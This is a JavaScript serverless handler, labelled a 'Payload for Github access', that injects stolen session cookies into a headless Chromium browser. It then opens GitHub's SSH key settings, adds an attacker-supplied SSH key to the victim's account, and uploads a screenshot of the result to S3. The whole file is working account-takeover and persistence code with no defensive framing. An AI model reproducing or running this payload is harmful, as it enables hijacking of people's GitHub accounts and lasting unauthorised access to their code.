/**
 *
 * Payload for Github access
 * Add a ssh key and take screenshot
 *
 **/

const { uploadScreenshot } = require("./uploadScreenshot");
const chromium = require("@sparticuz/chromium");
const puppeteer = require("puppeteer-core");

module.exports.pwn = async (event) => {

  try {
    const browser = await puppeteer.launch({
      args: chromium.args,
      defaultViewport: chromium.defaultViewport,
      executablePath: await chromium.executablePath(),
      headless: chromium.headless,
      ignoreHTTPSErrors: true,
    });

    //console.log(event);
    const d=JSON.parse(JSON.stringify(event));
    const sshkeytitle=d.task.params.sshKeyTitle;
    const sshkey=d.task.params.sshKey;
    //console.log(d.task.params.sshKey);
    const stolenCookies=d.cookies;
    //console.log(d.cookies);
    //console.log(stolenCookies);

    const page = await browser.newPage();
    await page.setCookie(...stolenCookies);
//    const cookiesSet = await page.cookies("https://github.com");
//    console.log(JSON.stringify(cookiesSet));
    await page.goto("https://github.com/login", {
  // networkidle0 comes handy for SPAs that load resources with fetch requests.
  // networkidle2 comes handy for pages that do long-polling or any other side
  // activity
    timeout: 20000,
    waitUntil: ['load', 'domcontentloaded', 'networkidle0', 'networkidle2']
  });
    //debug
    console.log("Page Title:", await page.title());
    // GoTo SSH/NEW
    await page.goto('https://github.com/settings/ssh/new')
    console.log("Page Title:", await page.title());
    await page.click('#ssh_key_title');
    //await page.keyboard.type('recovery-key');
    await page.keyboard.type(sshkeytitle);
    await page.click('#ssh_key_key');
    await page.keyboard.type(sshkey);
    await page.click('#settings-frame > form > p > button');
    await page.waitForSelector('body > div.logged-in.env-production.page-responsive > div.application-main > main > div > header > a');
    console.log("Page Title:", await page.title());
    // Screenshot
    const screenshot = 'github';
    const imagePath = `/tmp/${screenshot}-${new Date().getTime()}.png`;
    await page.screenshot({ path: imagePath })


    // Debug purpose as usual
    console.log(' Login and screenshot done ')
    // upload screenshot to S3
    const url = await uploadScreenshot(imagePath, screenshot);

    //await page.close();
    await browser.close()
    //return result;
    console.log('result: ' + url )
  } catch (error) {
        throw new Error(error.message);
        }
};
